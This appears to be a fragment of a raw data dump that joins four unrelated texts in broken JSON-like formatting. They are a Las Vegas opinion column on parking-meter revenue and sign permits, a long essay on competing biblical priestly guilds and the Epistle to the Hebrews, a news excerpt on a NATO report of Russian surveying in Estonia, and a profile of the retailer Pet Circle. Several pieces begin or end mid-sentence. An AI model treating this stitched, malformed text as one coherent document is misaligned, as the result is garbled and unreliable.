same Jan. 11 issue of the Review-Journal that reported why Star Nurseries has taken down its chain-link fences also reports the city of Las Vegas is looking into making some changes with regards to its parking meter enforcement.\n\nTo try and help downtown businesses stay afloat, they’re considering a reduction in parking meter rates for shoppers, as well as issuing a “courtesy warning” rather than a ticket if someone stays only a few minutes past the expiration of their meter. Right?\n\nNo! Are you nuts? That would only happen in a healthy country, where tax-paid government agents still see it as their duty to help and protect the legal, tax-paying businesses that fund their salaries.\n\nInstead, Scott Adams, Las Vegas’ chief urban redevelopment officer, says the city — which already makes more than $2 million per year from parking fees and meters — is asking “is there a way to increase revenue?”\n\nParking revenues pay for debt service on the city garages and a 20-member staff of meter maids, and still produce a surplus for the city councilmen to spend as they see fit — despite the fact the original rationale for parking meters was merely to keep a small number of motorists from monopolizing the spaces all day.\n\nBut now, to meet budget shortfalls caused by the recession — which was largely caused and extended by “well-meaning” government economic interventions, in the first place — the city wants to see if there’s way to squeeze out more parking revenues, hiking fees and fines till “they find out where that point is where you can raise revenues and not lose customers,” Mr. Adams explains.\n\nThere’s a pattern here, and it’s one of a society in the final stages of decadence, when the government ceases to be a servant of the taxpayers and instead behaves like the dog that’s willing not merely to bite the master who feeds it, but to gnaw off an entire appendage — like the pigs taking over the farm in “Animal Farm.” (Please note that all the jobs “saved” by the Big 2009 Stimulus Bill have been government jobs.)\n\nHarry Pappas, whose family-owned block along Las Vegas Boulevard between Carson and Fremont was seized by the city a decade ago, still owns a small parcel of land downtown, near 6th Street and Carson. He’d like to rent it out to monthly parkers. He put up a plywood sign to that effect. So the city is threatening to fine him for putting up the sign without a permit.\n\nBut get this: When he inquired about getting a permit, the city said they won’t issue him one!\n\n“I don’t make enough money now to even pay the property taxes there, which is about a grand a year,” Harry says. “But they want me first to get a city business license, which costs $150, and then a state business license. Then they won’t even let me pull the permit for the sign; I’ve got to have a contract with a firm they recognize, and only that company can go pull the permit, and all the companies I talked to want from $200 to $500 for the sign,” which has to meet a set of aesthetic rules set by the city, including a requirement that it have “a border, kind of like a picture frame, I guess.”\n\nThe whole required operation would cost more than Harry figures he could make renting out the spaces. (In competition with city parking meters? You don’t suppose they could have set it up that way ON PURPOSE?)\n\n“The last time the guy called me about the sign, last Friday, I told him to go F himself,” Harry says. “I told him ‘You bastards have screwed up this whole economy with all your licences and taxes and permits.’ He said, ‘Oh, so you don’t believe in rules, is that it?’”\n\nPower to the parasites!",

  "latent_3329": "As a collection of diverse writings spanning roughly a thousand years, the Bible itself bears witness to the internecine priestly rivalries that plagued ancient Israel, and in one case even extended into the Christian era. And as is apparent from this entry’s title, each of these competing priestly guilds wrote a text whose purpose was to legitimate their guild’s right to be Yahweh’s sole anointed priests forever. In this rather lengthy post, we will survey how these competing texts interact with one another both historically and narratively, and the techniques these scribes used to legitimate their guild’s or sect’s perceived privilege to minister forever as Yahweh’s priest(s).\n\nReading the Pentateuch Narratively at Face-Value: Observing Contradictions and Discrepancies\n\nNumbers 25:6-13 presents Yahweh declaring “a covenant of eternal priesthood” to Phinehas and his seed as a direct result of Phinehas’ zeal in safeguarding Yahweh’s sacred space by killing a male Israelite and a female Midianite who encroach upon this sacred space. According to the chronology of this narrative, this all happens in the latter half of 40th year of the wilderness period (see Num 20:27-29 & 33:38).\n\nYet in this same latter half of this 40th year and at the same geographical location (on the plains of Moab), Yahweh contradictorily selects all Levites as his priests, to minister the cult before him forever (Deut 18:1-5; cf. 17:9, 17:18, 24:8, 27:9, 33:8-10). Has Yahweh forgotten the eternal covenant he has just proclaimed to solely Phinehas and his seed merely weeks or months earlier? Has he also completely forgotten that for the past 38 years he has repeatedly proclaimed Aaron and his seed as his sole anointed priests and conversely assigned all non-Aaronid Levites as non-priestly attendants to the Aaronid priests (see #152, #220)?\n\nThis is just one of the problems associated with reading the Bible’s “supposed” homogeneous narrative and message at face-value. Against this centuries later imposed framework, the texts of the Bible reveal multiple narratives, messages, and even ideologies. Narratively speaking the mess starts at Sinai. Let’s take a look at the texts.\n\n1) At Sinai, sometime in the last few months of the same year of the Exodus, Yahweh chooses Aaron and his seed among the tribe of Levi to minister as his sole officiating priests and declares that “they shall have the priesthood as an eternal law” (Ex 28:1-4, 41-43; 29:1-9). Only an Aaronid can be priest, atone for sins, enter Yahweh’s inner shrine, burn incense, etc. (see #220 & #254 for a summary of these Aaronid priestly privileges).\n\n2) Yet in Exodus 32:33, during this same time period, Yahweh threatens “to wipe out” Aaron (“the one who has sinned against me”) for his role in fabricating the Golden Calf (for more see #157, #160-161); and moreover it is the Levites in general and not the Aaronids who are here portrayed as functioning as priests, that is expiating and atoning for Aaron’s sin, by killing the guilty party.\n\nIn other words, while Moses is on top of Sinai receiving from Yahweh the “eternal law” stipulating that only Aaron and his seed can be priests, on the bottom of Sinai Aaron is in the process of fabricating one of Israel’s greatest sins, the Golden Calf! Can’t Yahweh foresee this—or, nay just peer down the mountain slope and see what’s transpiring below? He declares Aaron as his sole messiah (anointed priest) and yet minutes/hours/days later vows to wipe him out! Fickle this deity. Or are these different textual traditions, with competing priestly agendas, that were stitched together into their current positions centuries after they were written? But before we go there, let us continue with our naive reading of the narrative at face-value.\n\n3) Despite Aaron’s role in producing Israel’s “great sin” and Yahweh’s vow to wipe him out because of this sin, Yahweh nevertheless immediately (minutes/hours/days) changes his mind again and reaffirms on 1/1/2 (counting from the Exodus) Aaron and his seed’s sole right to be Yahweh’s anointed priests, “an eternal priesthood through their generations” (Ex 40:13-15; Lev 7:35-36).\n\n4) A month later (2/1/2), Yahweh tells Moses that all non-Aaronid Levites shall be given to Aaron and his seed “to attend to him,” “to do the work of the Tabernacle.” At this time Yahweh also reaffirms that Aaron and his sons alone “shall keep the priesthood. . . any outsider shall be put to death!” (Num 3:5-10; cf. 8:18-19).\n\n5) Sometime during the wilderness period the Kohathites, from the tribe of Levi, try to make a stand for the priesthood (or some of its functions) and Yahweh brutally repels them and reasserts that “one who is not from Aaron’s seed cannot come forward to burn incense in front of Yahweh” (that is, be in the Tent of Meeting). Any non-Aaronid “who approaches Yahweh’s Tabernacle will die” (Num 17-18). Yahweh also reaffirms the Levites subordination as ministers to the Aaronid priests (Num 18:2). See #246-250, #254.\n\n6) After Aaron’s death on the 5th month of the 40th year from the Exodus (Num 20:27-29), Yahweh grants Phinehas, Aaron’s grandson, “the covenant of eternal priesthood” for presumably preventing a non-Aaronid male and foreign woman from approaching Yahweh’s sacred space, as stipulated in previous laws found in Num 3-4 and 18. Thus Yahweh upholds his “eternal covenant” with the Aaronid priesthood through the seed of Phinehas (Num 25:6-13).\n\n7) Yet roughly in the same month or months, Yahweh, now forgetting everything that he has just announced as “eternal law” during the past 40 years—so apparently both long and short-term memory has failed him—contradictorily declares that all Levites, “all the tribe of Levi,” can minister as his priests “for all time,” offer burnt-offerings, atone for sins, eat of the sacred meals, and even burn incense in Yahweh’s presence (Deut 18:1-5; 17:9, 18; 24:8; 27:9; 33:8-10), all of which were unique privileges assigned solely to Aaron and his seed by Yahweh as “eternal laws” and an “eternal covenant.” In fact, Deuteronomy rather assumes that the whole tribe of Levites are eligible for the priesthood and all of its functions, while at the same time mentions nothing about the Aaronid priesthood nor their “eternal covenant” and selection by Yahweh as his sole anointed priests, nor the fact that Yahweh himself punished by death, and will punish by death, all non-Aaronid Levites who perform the priestly roles uniquely assigned to the Aaronids! Has Moses consciously suppressed and omitted from history Yahweh’s “eternal laws” with reference to Aaron and his seed, his granting of “a covenant of eternal priesthood” to the seed of Phinehas, and his commandment that all non-Aaronid Levites cannot approach Yahweh, burn incense before him, or administer to the cult? Or, is this a different textual tradition written by a different priestly guild?\n\nBut before we go there, we can proceed with this naive narrative reading beyond the books of the Pentateuch. So . . .\n\n8) Despite Yahweh’s insistence for 40 years that only Aaronids can minister as his priests, and that all non-Aaronid Levites are to be subordinated to the Aaronids as their attendants, we not only see Yahweh contradictorily change his mind at the end of the wilderness period (#7 above), but more so throughout the period of Judges, Samuel, and even the monarchy in Kings, Yahweh declares the Levites in general as priests! Additionally, we hear of an assortment of prophets and kings performing priestly roles that were uniquely assigned by Yahweh to the Aaronids alone on penalty of death! Conversely, we hear absolutely nothing about Aaronid priests, nor the eternal covenant established by Yahweh with the Aaronids alone, or his “eternal laws” stipulating that only Aaronids can stand before Yahweh and minister to him! In fact, we hear nothing of the Aaronid law codes found in Leviticus and Numbers throughout this time period! Indeed, on 2 separate occasions Yahweh reminds certain individuals of the everlasting covenant he contradictorily made with . . . not the Aaronids, but the Levites in general!?\n\nYahweh declares to the house of Eli at the birth of Samuel (1 Sam 2:27-30), that he has decided to revoke his covenant that he had made with the Levites in general in Egypt (?), and to instead reestablish it eternally with a yet unnamed Zadok and his seed (see 1 Kgs 2:35). There is no mention of the Aaronid eternal covenant. Yahweh declares to Jeremiah (33:17-22) that despite the destruction of Jerusalem and the Temple wrought by Babylon (actually by Yahweh himself according to Jeremiah’s theology) at the end of the 6th century, Yahweh will nevertheless reestablish his covenant with the Levitical priests (!). So Yahweh again seems to have forgotten his covenant with Aaron and Phinehas, and contradictorily claims that he had made a covenant with the tribe of Levi in general, which was operable during the monarchy and which he promises to restore. Has Yahweh’s memory failed him again? Or . . . is this a variant textual tradition?\n\nMy astute readers have most likely started putting the pieces together. Both of the textual traditions above refer to “the alleged” priestly covenant Yahweh made with the Levites in general. That is these texts reference the same ideology as we saw in Deuteronomy 18:1-5 & 33:8-10. And conversely they make no mention of, nor even remotely acknowledge, the “eternal covenant” and “eternal law” Yahweh made with the Aaronid priesthood and more specifically Phinehas and his seed. But we have not yet finished our naive surfacing reading of the Bible’s supposed homogeneous and unified narrative.\n\n9) Contrary to Jeremiah’s Yahweh who professes that prior to the destruction of the Temple, the Levites in general were priests during the monarchal period, Ezekiel’s Yahweh claims that it was on account of the Levites’ corruption in the cult that Jerusalem was destroyed in the first place. And contrariwise Yahweh will reestablish only the Zadokite line as his priests, not the entire tribe of Levi as the Yahweh of Jeremiah professes, and furthermore contradictory to Jeremiah’s Yahweh, all non-Zadokite Levites will be demoted to servants of the Zadokite priests! In other words, they will not be restored as priests (Ez 44:9-24). Furthermore, Yahweh declares that this is in accord, contrary to the above, with his Torah and Laws!\n\n10) Once again in contradictory fashion to #7 and #8 above (less so #9), the Yahweh of the 4th century post-exilic books of Chronicles claims that Aaronids did indeed function as Yahweh’s sole priests during most of the monarchy and in fact still are his sole priests, per Torah instructions (1 Chr 6:34, 23:13; 2 Chr 13:10, 31:4). Likewise, Yahweh declares as well that all non-Aaronid Levites are to be ministers to the Aaronid priests per Yahweh’s Torah instructions. This all sounds familiar and correlates with #1, and #3-6 above.\n\n11) The Yahweh of Malachi, however, now claims again that he had made a covenant “with Levi” (2:4) in general concerning the priesthood. This text continues by claiming that the current levitical (?) priesthood has been corrupted and that Yahweh will send an anointed priest to rectify this cultic corruption. As a side note, the word “messiah” is only used of the Aaronid priests throughout the entire Bible (that is in P uniquely), save Daniel 9:26 which speaks of Onias III as an anointed priest, and Zechariah 4:14 which, like Malachi, expresses the hope that Yahweh will restore an anointed priest (and king) in Jerusalem.\n\n12) And lastly we have a late 1st century secular writer claiming, with appeals to divine authority, that God (= Yahweh?) never declared an eternal covenant of priesthood with Aaron, never declared an eternal covenant with Levi, never declared an eternal covenant with Phinehas, and never declared an eternal covenant with Zadok and his seed, but relying on a spurious interpretation of a single verse which seems to recognize David’s role as priest claims that Yahweh made a priest of Jesus Christ forever in the manner of Melchizedek!\n\nEven from this quick survey of a surface reading of the Bible’s texts mentioning its various and contradictory priesthoods we can conclude:\n\nThese competing views and claims concerning which group or person Yahweh selected as his priests reflect competing priestly guilds or sects that each wrote texts legitimating their claims. The scribes who wrote these texts used Yahweh as a mouthpiece for their own beliefs, ideologies, and self-legitimation. Said differently, the Yahweh of these texts are no more than the literary creations of the authors who penned these texts in order to divinely legitimate the claims they were making about their priestly guilds. We visibly see, in other words, that the Yahweh of each one of these texts, not surprisingly, believes exactly what each one of these different authors—with their competing and contradictory beliefs—believed and was advocating! Indeed, this is what ancient literature was and did! But again, we have jumped ahead of ourselves.\n\nA Historical Reading of the Texts\n\nAll of the textual discrepancies, contradictions, and even Yahweh’s wavering laws and views concerning the priesthood enumerated above can be explained when one listens to the textual data and realizes that these contradictory views stem from once independent textual traditions—all of which were later stitched together and as a result created the very discrepancies and contradictions enumerated above. So now let us do an historical reading of these texts, that is what the study of these texts themselves have revealed.\n\nThe Post-Exilic Aaronid Priesthood and the Texts They Wrote\n\nFirst, it is not a coincidence that the only bodies of literature that mention the eternal covenant of the Aaronid priesthood, and the fact that all other non-Aaronid Levites are to be subordinated to the Aaronids are the texts encompassing the last chapters of Exodus (Ex 25-31 & 35-40), the book of Leviticus, and 70% of Numbers on the one hand, and the books of Chronicles on the other hand—that is, what scholars have identified as the Priestly scroll on the one hand and the 4th century text of Chronicles on the other hand.\n\nSecond, on the flip side, it is not a coincidence that the textual traditions, and the Yahweh of these textual traditions, in Deuteronomy, Joshua to Kings, and Jeremiah do not mention nor even acknowledge the existence of an Aaronid priesthood, the “eternal law” of priesthood granted to Aaron and his seed by Yahweh, and the subordination of all other non-Aaronid Levites. That is, while the 4th century work of Chronicles repeatedly mentions the eternal covenant of the Aaronid priesthood and the subordination of all non-Aaronid Levites, and to a lesser degree ditto for the 4th century books of Ezra and Nehemiah, the 9th-7th century books of Joshua through Kings, and even Jeremiah do not! Why? Because the Aaronid Priestly scroll (Gen 1:1-2:3, 5:1-31, 11:10-32, 17:1-27, 28:1-9, 48:3-7; Ex 6:2-30, 12:1-20, Ex 25-31 & 35-40, the book of Leviticus, and 70% of Numbers) had not yet been written!\n\nIn other words, two of the decisive reasons why the Priestly source of the Torah has been dated by scholars to the post-exilic period is:\n\nbecause of its parallels in language and Aaronic priestly ideology with other post-exilic texts, particularly the books of Chronicles, but also to a lesser degree Ezra, Nehemiah, and Ezekiel; and because no other texts of the Bible, particularly the history from Deuteronomy to Kings, and the text of Jeremiah display any knowledge of the cultic law code found in Leviticus, nor for that matter Yahweh’s decree that solely Aaronids are to minister before Yahweh in an eternal covenant throughout their generations.\n\nAdditionally, when the 4th century author of Chronicles renarrates the same monarchic period described in the earlier books of Kings, he does so by adding retrospectively into his retelling his own priestly ideology so that in his and only his retelling of this history the Aaronid priesthood did indeed function as priests through the monarchy, contrary to the books of Kings.\n\nThe Chronicler creates an Aaronid pedigree for Zadok, and showing an awareness of the “covenant of eternal priesthood” given to Phinehas in Num 25:6-13, assigns Zadok’s Aaronid heritage to Phinehas’ genealogy (1 Chr 15:11). The exilic priest Ezekiel could have been pulling from the same tradition when he has Yahweh proclaim that only Zadokites (understood as Aaronids from the line of Zadok) are to be priests and all other non-Zadokites are to be demoted to non-priestly attendants. The Chronicler accredits David with following Priestly legislation by claiming that it was David who divided the Levites into Aaronid priests and all other non-Aaronid Levites, per Torah instruction (2 Chr 8:14), that is per the Priestly scroll (contra D and Jeremiah)! The Chronicler also accredits Hezekiah with reestablishing this Aaronid priests and all other Levites division, per, the Chronicler claims, “the Torah of Moses” (2 Chr 30:16, 31:2-4), but again this is contradictory to “the Torah of Moses” per Deuteronomy and the Yahweh of Deuteronomy!\n\nAdditionally, the authors of these 4th century texts—Chronicles, Nehemiah, and Ezra—who were most likely Aaronid priests themselves or sympathetic to Aaronids, constantly refer to the past (again contra Deuteronomy through Kings) and the present by speaking of the distinction between “the priests and the Levites” (1 Chr 13:2, 15:14, 23:2; 2 Chr 11:3, 24:5, 29:4, 29:25-35, 35:10; Ezra 1:5, 2:30, 3:8, 6:20, 7:7, 9:1; Neh 12:30).\n\nFurthermore, there are several places where the 4th century author of Chronicles specifically references laws only found in the Priestly scroll, and again this evidence should be weighed against the fact that Deuteronomy through Kings do not reference this body of legislation, that is the Priestly source. For example,\n\nAnd the Levites were appointed to all manner of the services of the Tabernacle of the house of God. But Aaron and his sons made offerings upon the altar of burnt-offering and upon the altar of incense [see Num 17-18], performing all the tasks of the most holy place, to make atonement for Israel, according to all that Moses the servant of God had commanded. (1 Chr 6:48-49; cf. 2 Chr 13:10)\n\nThe appointment of the Levites as ministers of the Tabernacle and conversely the Aaronids as sole priests “according to all that Moses commanded” is a direct reference to legislation found only in the Priestly scroll (Ex 28:1-4, 41-43; 29:1-9; 40:13-15; Lev 7:35-36; Num 3:5-10; 8:18-19; 18:2-7). And, conversely, a direct refusal to acknowledge the contradictory legislation in the Deuteronomic version of Moses’ commandments! This is because the author of Chronicles is referencing another text produced by this same Aaronid guild, and used to further legitimate their “divine” appointment.\n\nWhat we should note in all of this is that both the Priestly scroll and Chronicles-Ezra-Nehemiah are post-exilic compositions written in the Persian period when Israel had no king. The Aaronid priesthood functioned as both the political and religious leader during this temple-state, and they wrote the Priestly scroll circa the 6th century and set its narrative in the archaic past at Sinai in order to legitimate their “divinely-ordained” sole right to rule as Yahweh’s anointed priests, while conversely subordinating all other non-Aaronid Levites underneath them. These pro-Aaronid “eternal laws” and “covenant of eternal priesthood” were an attempt to single out with divine authority the Aaronids from among the tribe of Levi as Yahweh’s sole priests. Prior to these post-exilic creations, in other words, there was the Deuteronomic “Mosaic” legislation accrediting all the tribe of Levi with these priestly functions. In other words, this 7th century body of literature did not know of the 6th century Priestly scroll with its pro-Aaronid legislation and ideology because it had not yet been written!\n\nThe pre-exilic Deuteronomic School and the Levitical Priesthood\n\nThe literature so far suggests that the Aaronid priesthood did not come to power until the post-exilic era, wherein they wrote texts—the Priestly scroll—set in the archaic past to legitimate their “eternal covenant” as Yahweh’s anointed priests, and rewrote history—the books of Chronicles—to have history now accord with their ideology. On the other hand, the literature also suggests that it was common practice prior to the post-exilic era for the whole tribe of Levi to function as Yahweh’s priests. And these levitical scribes also wrote texts to legitimate their priesthood.\n\nScholars have long surmised that the absence of any Aaronid ideology, and conversely the presence of an agenda that for all intents and purposes may be labeled as pro-Levitical, in Deuteronomy, Joshua, Samuel, and Kings was due to the fact that the Priestly scroll had not yet been written! In other words, the Moses of Deuteronomy can claim as Yahweh’s commandments that all Levites may be priests, atone for sins, place burnt-offerings on the altar, and burn incense, etc. (Deut 18:1-5; 17:9, 18; 24:8; 27:9; 33:8-10) because the pro-Aaronid legislation that narratively precedes the book of Deuteronomy historically had not been written yet! Deuteronomy is the product of the 7th century; whereas the Priestly scroll (Leviticus and 70% of Numbers) was most likely penned in the 6th and 5th centuries. Even the 6th century book of Jeremiah doesn’t bear witness to the Priestly scroll, contradictorily claiming that Yahweh has and will select all Levites as his priests, and as we previously saw also contradictorily claiming against the Priestly source and its Yahweh, that Yahweh did not command sacrifices during the wilderness period, which the Aaronid written Priestly scroll is adamant in saying that he did (#155).\n\nThese differences, as well as hundreds of other textual differences and contradictions evidenced by this collection of ancient literature irrefutably bear witness to different and competing textual traditions which represented competing agendas, ideologies, and rivalry priesthoods.\n\nThe presentation of Aaron as responsible for fabricating one of Israel’s greatest sins is a prime example. Here, this author attempted to denigrate the line of Aaronid priests by attacking their forefather, Aaron—or at least showing him in a less than favorable light. Historically we know that the Golden Calf narrative is a polemic and parody of Jeroboam I’s calf altars in northern Israel (see 2 Kgs 17; #162), which were most likely officiated over by Aaronid priests. Thus the pro-levitical author of this narrative claims that Jeroboam and his Aaronid-led priests are committing apostasy by worshiping calves (see #157). Historically speaking then, “the one who has sinned” against Yahweh and whom Yahweh threatens to wipe out is in fact Jeroboam 1 and the northern kingdom, seen from the perspective of southern Judean scribes as Assyria’s destruction of Israel in 722 BCE.\n\nMelchizedek, Jesus Christ, and the Author of Hebrews\n\nAs surveyed above, ancient priestly guilds wrote texts set in the archaic past that legitimated their guild’s beliefs and ideology by placing those beliefs on the lips of Yahweh in their textual compositions and having Yahweh select their guild’s forefather and his seed as sole right to function as his priests. In later Jewish and early Christian periods, scribes no longer wrote narratives set in the archaic past to legitimate their beliefs; rather since this collection of Jewish literature—the Laws and the Prophets—had earned themselves the status of “the word of God” by the 1st century BCE, New Testament authors merely had to re-interpret this text in support of their own beliefs, thus also legitimating with appeals to divine authority their own beliefs and ideology. This is exactly what the author of Hebrews does in his reinterpretation of Psalms 110:4, and indeed in his citation of just about every Old Testament text he uses.\n\nPsalm 110:4 in its proper Jewish context already evidences interpretive problems. First, Hebraists alternate between a reading of the Hebrew malkî-zedek as referring to the mysterious character Melchizedek of Genesis 14 (see #3) and a more literal rendering as “the righteous king,” and thus a reference to David or the Davidic line. In either case, the Psalm most likely reflects the views of an era or author who saw David or the Davidic king embodying both functions of king and priest. The Psalm itself, despite its use and reinterpretation in the early Christian period, is addressed to a Lord, either envisioned as David himself or a later Davidic king. Or, this Psalm might function as a polemic against kingship (see verse 5) and instead of a kingly rule, it expresses the rule of a priest “forever after the manner of Melchizedek.” But in either case, this text was not intended by its author as a messianic prophecy of Jesus! These beliefs, obviously, reflect those of its 1st century CE readership and not the author of this text nor the historical circumstances he sought to address.\n\nPsalm 110 is not the only visible place where this author imposes his own beliefs upon the texts of the Hebrew canon, squeezing from them an interpretation that not surprisingly accords and affirms this author’s own beliefs. For this same hermeneutic violence happens with almost every other passage he cites or alludes to in reference to his interpretation of Psalm 110.\n\nThe author of Hebrews claims, against the textual evidence, that there was a change in the priesthood and that another Aaronid priesthood after the Torah did not arise (7:11-12). Additionally, he seems to accredit this as an “annulling of the former commandment” (7:18). Our author’s argument is that since Psalms 110 comes after the Torah, then it has annulled the law (Heb 7:18, 28). But this pre-biased interpretation not only favors this author’s personal theology, but it fails to address the texts of the Torah themselves as well as texts coming after the Torah, narratively speaking. For we have seen above that Yahweh selects the Levitical priesthood to rule forever (Jer 33:17-22), and the Zadokite Aaronid priesthood (Ezek 44 & Chronicles). So following this author’s loose rationale, we could continue this type of logic by noting that since the text of Ezekiel comes after Psalms, even if we were to read Psalm 110 as this author did, we would have to conclude that Yahweh makes an eternal covenant of priesthood with the Zadokite line, not the order of Melchizedek! The alleged “former commandment” that this author refers to with respect to the Torah laws about the Aaronid priesthood also denies what the text—and its Yahweh!—claim. The Aaronid priesthood is called “an eternal law” and expressed as an “eternal covenant” by Yahweh himself! This author also speaks of there being no “oath,” when indeed there is more than an oath being expressed in Leviticus, Ezekiel, Jeremiah, and Chronicles. What is spoken of are eternal covenants or priesthoods envisioned as remaining forever. This brings me to this author’s use of Jeremiah 31:31-34 (Heb 8:10-12), a staple passage in later Christian exegesis used to substantiate their reading of the “new covenant,” again at the expense of the message of our author here, Jeremiah, and his God! For this new covenant that Jeremiah speaks of, contrary to the author of Hebrews’ attempted exegesis, explicitly identifies the Levites as those whom Yahweh will re-establish this new covenant with, not Melchizedek (Jer 33:17-22)! So our 1st century CE author grossly and falsely re-presents these textual traditions.\n\nOf course, this is all transparent to astute readers. The whole scriptural argument throughout Hebrews is designed for one purpose and one purpose only—to lend authority to his and his community’s beliefs about Jesus the Christ. But these beliefs come at the expense of the texts of the Hebrew Bible and the beliefs and messages of these authors.\n\nFinally, similar to the manner in which this author fails to truthfully re-present the beliefs of the various authors of the Hebrew canon he cites, modern Christians also fail to truthfully re-produce, let alone understand, this author’s unique set of beliefs.\n\nBesides his scriptural argument to present Christ and his alleged priesthood in the order of Melchizedek as a higher and “perfect” priesthood, his aim was also to claim analogously that Christ’s sacrifice on the cross, his blood, was more efficacious than the blood thrown on the altar of Yahweh by the Aaronid priesthood. His point? That contrary to the sacrificial slaughtering of goats and sheep and the annual “necessity” to atone for new sins, Christ’s sacrificial blood atoned for sins once and for all (7:27, 9:12, 10:2-3, 10:10). Thus this author’s personal theological conviction that Christ’s blood atoned for sins once and for all rests on an imperceptible premise that often goes unnoticed by Christin readers—namely, that once a Christian has been purified through Christ’s sacrifice, he cannot sin again! Indeed to do so denigrates, insults, and renders common Christ’s sacrificial blood atonement to the level of those earthly sacrifices performed by the Aarond priesthood, a point which our author has vehemently argued against. Here are the passages where this theology is most clearly expressed.\n\nFor it is impossible for those who were once enlightened, and have tasted the heavenly gift, and have become partakers of the holy spirit, and have tasted the good word of God and the powers of the age to come, if they have fallen away, to renew them again to repentance since they would crucify again for themselves the son of God and put him to an open shame. (6:4-6) Not that he should offer himself often as the high priest enters the most holy place every year with blood of another; for he then would have had to suffer often since the foundation of the world. But now, once at the end of the ages, he has appeared to put away sin by the sacrifice of himself. And as it is appointed for men to die once, but after this the judgment, so Christ was offered once to bear the sins of many. (9:25-28) For the worshipers, once purified, would have had no more consciousness of sins. But in those [i.e., the Aaronids’] sacrifices there is a reminder of sins every year. For it is not possible that the blood of bulls and goats could take away sins. (10:2-3) And every priest stands ministering daily and offering repeatedly the same sacrifices which can never take away sins. But this man, after he had offered one sacrifice for sins forever, sat down at the right hand of God from that time waiting till his enemies are made his footstool. For by one offering he has perfected forever those who are being sanctified. (10:11-14) For if we sin willfully after we have received the knowledge of the truth, there no longer remains a sacrifice for sins, but a certain fearful expectation of judgment and fiery indignation which will devour the adversaries. Anyone who has rejected Moses’ law dies without mercy on the testimony of two or three witnesses. Of how much worse punishment do you suppose will he be thought worthy who has trampled the son of God underfoot, counting the blood of the covenant by which he was sanctified a common thing and insulted the spirit of grace? (10:26-29)\n\nAll these verses express a similar idea—that having been atoned forever for one’s sins via the one-off sacrifice of Christ’s blood, that individual can never sin again. Indeed there is no more sin; for if there was Christ’s sacrifice of atoning for sin forever would be reduced to the common Aaronid sacrifice! Anyone sinning again, according to this author: 1) demotes Christ’s sacrifice to the earthly plane similar to the common sacrifices of the Aaronid priestly cult, where we are then forced to “crucify Christ again”; and 2) places the offender on the same plane as someone who will now be judged!\n\nIn conclusion, we see that in the same way that the Aaronid guild who wrote Leviticus & Numbers legitimated their sole right to be Yahweh’s priests by writing a text that presented Yahweh granting them the priesthood eternally, and like the Levites who also wrote a text where they presented Yahweh selecting them, and ditto for Ezekiel and the Zadokites who write a text that presented Yahweh legitimating the Zadokites as priests, so too the author of Hebrews presented a scriptural interpretation from “divine authority” that basically did the same vis-a-vis Christ. All of these texts represent the beliefs of their authors—beliefs which were then legitimated through the mouthpiece of that particular community’s god.\n\nFinally, modern Christians continue in this same practice. While holding to modern beliefs that are completely contradictory to those expressed in Hebrews for example, modern Christians will nevertheless claim through a process of re-interpretation (or violent re-appropriation) that this text, now seen as divinely inspired, legitimates their, the reader’s, beliefs. What this hermeneutic process reveals is that reader’s beliefs have trumped and triumphed over those of the writers of these texts. For my part, I have attempted to be honest to each one of these author’s beliefs on their terms, to re-produce those beliefs, and to understand them as products of their own historical climates and literary worlds. What each one of these authors believed is now a relic of the past. Modern readers replace these author’s beliefs with their own, and legitimate them, like the authors of these texts did, with appeals to divine authority.",

Just east of the Russian border crossing point is a Russian airborne brigade and a Russian helicopter brigade meant to support the airborne brigade,» the NATO report says.\n\nThe main road starts at the Estonian-Russian border. Defence sources say this key road may have been surveyed to check whether bridge dimensions and tolerances would allow tanks and heavy weapons to cross.\n\nFirst wave\n\nThere is also a strategically important railway line from the Estonian-Russian border in the south.\n\nAccording to the NATO report, both the main road and railway are probable targets for Russia if it at some point decided to carry out a military invasion.\n\nThese could be «an objective for the Russian airborne and (special operations) SOF units in the event of a Russian invasion into Estonia.»\n\nThe airborne brigade and Russian special forces could be the first wave of any possible invasion, concludes NATO.\n\nPsychological warfare\n\nAldrimer.no understands that Russian diplomats made no effort to hide their mapping efforts, suggesting that an invasion was probably not imminent and that the intent may have been much broader than just checking bridge structures.\n\n«Being so open about their efforts means that we can’t rule out the that the main purpose may have been psychological warfare against NATO and the Estonian authorities,» said a NATO source.\n\nNATO and the Estonian authorities both assume that diplomats who did the surveys in southern Estonia actually work for Russian intelligence.\n\nDeclined to comment\n\nNATO spokesperson Rehanna Jones-Boutaleb declines to comment on the story.\n\n«We never comment on alleged leaks of confidential information», Jones-Boutaleb informs aldrimer.no in an email.\n\nNeither will the Ministry of Defence in Estonia.

Credit:Brendon Thorne Frizell has worked as an engineer, investment banker and consultant and drew on this background to be very strategic in his approach to starting a business. He decided to focus on pet retail after identifying it as a fragmented market with strong macro trends. Importantly, pet goods are viewed as a non-discretionary spend and spending in the segment continues through times of recession and downturn. Frizell and Edwards started the business in a co-working space in Ultimo using a nearby 16-square-metre Kennards storage space as a warehouse.\n\nMike Frizell founded Pet Circle just over six years ago. Credit:Brendon Thorne They paid $5000 for a website and listed 16 types of pet food on the site and then sat and waited for the orders to come in. None came. This was Frizell's first lesson in the lead time needed for pet food. \"There is a cycle,\" he says. \"You have to wait for people to run out of the product. You can't force it.\"\n\nIf we did retail it would look nothing like a pet store. Mike Frizell The early days allowed Frizell to prove that Pet Circle was not just a transactional business – rather, it attracted life-time customers that kept coming back. \"We quickly discovered this is scaleable,\" Frizell says. \"We finally found ourselves in the position where customers are loyal and we can get them but they cost money to get.\" After nine months trading, Frizell ran the financial models as to when the business would \"make good sense\" and calculated it at $30 million in turnover. He then worked out how much money he needed to get from zero to $30 million and concluded he needed $423,000 which he acquired through friends, family and bankers in Pet Circle's \"first foray into capital markets\".\n\nIn funding the business, one of Frizell's set rules has been an ordinary share deal with no preference shares which has made it hard at times to attract investment. Frizell says he doesn't agree with investors having the ability to get their money out first. \"I think personally that misaligns people,\" he says. There have been challenges along the way, including when Pet Circle outgrew its warehouse and so shipping was slowed down by 24 hours. \"The difference in shipping in one day and two is huge,\" Frizell says.\n\nIt's the one time Pet Circle didn't grow. Another challenge was setting up an office in the Philippines after Frizell looked to replicate what someone would do if they tried to attack his business. \"It was horrific for the first year,\" Frizell admits. But now with the benefit of a real-time live feed between Pet Circle's three offices, the Philippines office is functioning well and has helped cut Pet Circle's costs. Frizell credits business networking and support group the Entrepreneurs Organisation as a major source of support in growing Pet Circle.\n\n\"It gives you a lot more confidence,\" he says. \"In the early days you second guess yourself. In the early days you are kind of asking 'Am I insane?'\" The second guessing has paid off with Pet Circle now occupying a 7000-square-metre warehouse in Alexandria and employing 130 staff. \"It brings you a whole world of different problems to solve,\" Frizell says. \"We are still 